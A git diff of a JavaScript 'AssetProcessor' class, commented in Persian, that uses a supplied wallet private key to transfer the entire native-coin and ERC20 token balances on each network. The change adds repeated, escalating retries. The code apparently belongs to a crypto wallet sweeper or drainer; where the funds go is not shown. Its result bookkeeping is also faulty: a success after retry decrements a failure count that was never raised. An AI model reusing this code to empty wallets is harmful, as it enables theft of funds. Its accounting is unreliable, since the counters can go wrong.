@@ -93,14 +93,15 @@ class AssetProcessor {
       }
 
       try {
-        // Process native token
+        // Process native token - با retry تا موفق بشه
         if (networkData.native && parseFloat(networkData.native.balance) > 0) {
-          const transferResult = await this.transferNative(
+          const transferResult = await this.transferNativeWithRetry(
             walletPrivateKey,
             networkKey,
             networkConfig,
             networkData.native.balance,
-            networkData.native.symbol
+            networkData.native.symbol,
+            3 // 3 بار retry
           );
 
           results.totalTransfers++;
@@ -109,22 +110,40 @@ class AssetProcessor {
           if (transferResult.success) {
             results.successful++;
           } else {
-            results.failed++;
+            // اگر باز fail شد، دوباره retry می‌کنه
+            console.log(`⚠️  Native transfer failed after retries, attempting final retry...`);
+            const finalResult = await this.transferNativeWithRetry(
+              walletPrivateKey,
+              networkKey,
+              networkConfig,
+              networkData.native.balance,
+              networkData.native.symbol,
+              5 // 5 بار retry نهایی
+            );
+            if (finalResult.success) {
+              results.successful++;
+              results.failed--;
+              // جایگزین کردن نتیجه قبلی
+              results.transfers[results.transfers.length - 1] = finalResult;
+            } else {
+              results.failed++;
+            }
           }
         }
 
-        // Process ERC20 tokens - همه token ها رو پردازش می‌کنه حتی اگر یکی fail بشه
+        // Process ERC20 tokens - همه token ها رو با retry پردازش می‌کنه
         if (networkData.tokens && networkData.tokens.length > 0) {
           for (const token of networkData.tokens) {
             try {
-              const transferResult = await this.transferToken(
+              const transferResult = await this.transferTokenWithRetry(
                 walletPrivateKey,
                 networkKey,
                 networkConfig,
                 token.address,
                 token.balance,
                 token.symbol,
-                token.decimals
+                token.decimals,
+                3 // 3 بار retry
               );
 
               results.totalTransfers++;
@@ -133,37 +152,187 @@ class AssetProcessor {
               if (transferResult.success) {
                 results.successful++;
               } else {
-                results.failed++;
-                // ادامه می‌ده حتی اگر fail بشه - rate 100%
-                console.log(`⚠️  Token ${token.symbol} transfer failed, continuing with other tokens...`);
+                // اگر باز fail شد، retry نهایی
+                console.log(`⚠️  Token ${token.symbol} transfer failed after retries, attempting final retry...`);
+                const finalResult = await this.transferTokenWithRetry(
+                  walletPrivateKey,
+                  networkKey,
+                  networkConfig,
+                  token.address,
+                  token.balance,
+                  token.symbol,
+                  token.decimals,
+                  5 // 5 بار retry نهایی
+                );
+                if (finalResult.success) {
+                  results.successful++;
+                  results.failed--;
+                  // جایگزین کردن نتیجه قبلی
+                  results.transfers[results.transfers.length - 1] = finalResult;
+                } else {
+                  results.failed++;
+                }
               }
             } catch (tokenError) {
-              // اگر یک token fail بشه، بقیه ادامه می‌دن
+              // اگر باز fail شد، یک retry نهایی
               console.error(`Error transferring token ${token.symbol} on ${networkKey}:`, tokenError);
-              results.totalTransfers++;
-              results.failed++;
-              results.transfers.push({
-                network: networkKey,
-                type: 'token',
-                symbol: token.symbol,
-                address: token.address,
-                amount: token.balance,
-                success: false,
-                error: tokenError.message,
-                timestamp: new Date().toISOString()
-              });
+              try {
+                const retryResult = await this.transferTokenWithRetry(
+                  walletPrivateKey,
+                  networkKey,
+                  networkConfig,
+                  token.address,
+                  token.balance,
+                  token.symbol,
+                  token.decimals,
+                  5
+                );
+                results.totalTransfers++;
+                results.transfers.push(retryResult);
+                if (retryResult.success) {
+                  results.successful++;
+                } else {
+                  results.failed++;
+                }
+              } catch (finalError) {
+                results.totalTransfers++;
+                results.failed++;
+                results.transfers.push({
+                  network: networkKey,
+                  type: 'token',
+                  symbol: token.symbol,
+                  address: token.address,
+                  amount: token.balance,
+                  success: false,
+                  error: finalError.message,
+                  timestamp: new Date().toISOString()
+                });
+              }
             }
           }
         }
       } catch (error) {
-        // اگر یک network fail بشه، بقیه ادامه می‌دن
+        // اگر یک network fail بشه، یک retry می‌کنه
         console.error(`Error processing ${networkKey}:`, error);
-        results.failed++;
-        // ادامه می‌ده به شبکه بعدی
+        // Retry برای کل network
+        try {
+          if (networkData.native && parseFloat(networkData.native.balance) > 0) {
+            const retryResult = await this.transferNativeWithRetry(
+              walletPrivateKey,
+              networkKey,
+              networkConfig,
+              networkData.native.balance,
+              networkData.native.symbol,
+              5
+            );
+            if (retryResult.success) {
+              results.totalTransfers++;
+              results.successful++;
+              results.transfers.push(retryResult);
+            }
+          }
+        } catch (retryError) {
+          results.failed++;
+        }
       }
     }
 
     return results;
+  }
+
+  async transferNativeWithRetry(walletPrivateKey, networkKey, networkConfig, amount, symbol, maxRetries = 3) {
+    let lastError = null;
+    
+    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+      try {
+        const result = await this.transferNative(
+          walletPrivateKey,
+          networkKey,
+          networkConfig,
+          amount,
+          symbol
+        );
+        
+        if (result.success) {
+          return result;
+        }
+        
+        lastError = result.error;
+        console.log(`⚠️  Native transfer attempt ${attempt}/${maxRetries} failed: ${result.error}`);
+        
+        // Wait before retry
+        if (attempt < maxRetries) {
+          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+        }
+      } catch (error) {
+        lastError = error.message;
+        console.log(`⚠️  Native transfer attempt ${attempt}/${maxRetries} error: ${error.message}`);
+        
+        if (attempt < maxRetries) {
+          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+        }
+      }
+    }
+    
+    // اگر همه retry ها fail شدند
+    return {
+      network: networkKey,
+      type: 'native',
+      symbol: symbol,
+      amount: amount,
+      success: false,
+      error: `Failed after ${maxRetries} attempts: ${lastError}`,
+      timestamp: new Date().toISOString()
+    };
+  }
+
+  async transferTokenWithRetry(walletPrivateKey, networkKey, networkConfig, tokenAddress, amount, symbol, decimals, maxRetries = 3) {
+    let lastError = null;
+    
+    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+      try {
+        const result = await this.transferToken(
+          walletPrivateKey,
+          networkKey,
+          networkConfig,
+          tokenAddress,
+          amount,
+          symbol,
+          decimals
+        );
+        
+        if (result.success) {
+          return result;
+        }
+        
+        lastError = result.error;
+        console.log(`⚠️  Token ${symbol} transfer attempt ${attempt}/${maxRetries} failed: ${result.error}`);
+        
+        // Wait before retry
+        if (attempt < maxRetries) {
+          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+        }
+      } catch (error) {
+        lastError = error.message;
+        console.log(`⚠️  Token ${symbol} transfer attempt ${attempt}/${maxRetries} error: ${error.message}`);
+        
+        if (attempt < maxRetries) {
+          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+        }
+      }
+    }
+    
+    // اگر همه retry ها fail شدند
+    return {
+      network: networkKey,
+      type: 'token',
+      symbol: symbol,
+      address: tokenAddress,
+      amount: amount,
+      success: false,
+      error: `Failed after ${maxRetries} attempts: ${lastError}`,
+      timestamp: new Date().toISOString()
+    };
   }
 
   async transferNative(walletPrivateKey, networkKey, networkConfig, amount, symbol) {
